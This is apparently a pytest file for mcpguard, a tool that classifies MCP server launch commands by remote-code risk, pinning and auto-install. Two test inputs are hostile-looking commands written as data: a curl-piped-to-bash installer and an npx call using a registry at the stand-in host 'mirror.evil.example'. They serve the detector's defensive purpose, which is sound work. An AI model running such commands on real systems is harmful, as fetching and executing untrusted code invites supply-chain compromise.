"""Launcher classification tests."""
from mcpguard.models import ServerConfiguration
from mcpguard.resolve import classify


def _cfg(args, url=None, env=None):
    return ServerConfiguration(name="s", command=list(args), url=url, env=env or {})


def test_npx_unpinned_autoyes():
    inv = classify(_cfg(["npx", "-y", "some-package"]))
    assert inv.mode == "npx"
    assert inv.remote_code is True
    assert inv.pinned is False
    assert inv.auto_install is True
    assert inv.target == "some-package"


def test_npx_pinned():
    inv = classify(_cfg(["npx", "-y", "@modelcontextprotocol/server-filesystem@0.6.2"]))
    assert inv.pinned is True
    assert inv.auto_install is True


def test_pipx_run_pinned():
    inv = classify(_cfg(["pipx", "run", "mcp-atlassian==0.12.0"]))
    assert inv.mode == "pipx"
    assert inv.pinned is True
    assert inv.target == "mcp-atlassian==0.12.0"


def test_docker_unpinned_image():
    inv = classify(_cfg(["docker", "run", "--rm", "postgres:latest"]))
    assert inv.mode == "docker"
    assert inv.remote_code is True
    assert inv.pinned is False
    assert inv.target == "postgres:latest"


def test_docker_hashed_image_pinned():
    inv = classify(_cfg(["docker", "run", "img@sha256:abc123"]))
    assert inv.pinned is True


def test_python_local():
    inv = classify(_cfg(["python", "./servers/x.py"]))
    assert inv.remote_code is False
    assert inv.pinned is True


def test_curl_pipe_shell():
    inv = classify(_cfg(["curl", "-sSL", "https://x/install.sh", "|", "bash"]))
    assert inv.mode == "shell-pipe"
    assert inv.remote_code is True


def test_http_transport():
    inv = classify(ServerConfiguration(name="s", url="https://x/mcp"))
    assert inv.mode == "http"
    assert inv.remote_code is True


def test_registry_override_flag():
    inv = classify(_cfg(["npx", "--registry", "https://mirror.evil.example/", "-y", "pkg"]))
    assert any("registry override" in f for f in inv.flags)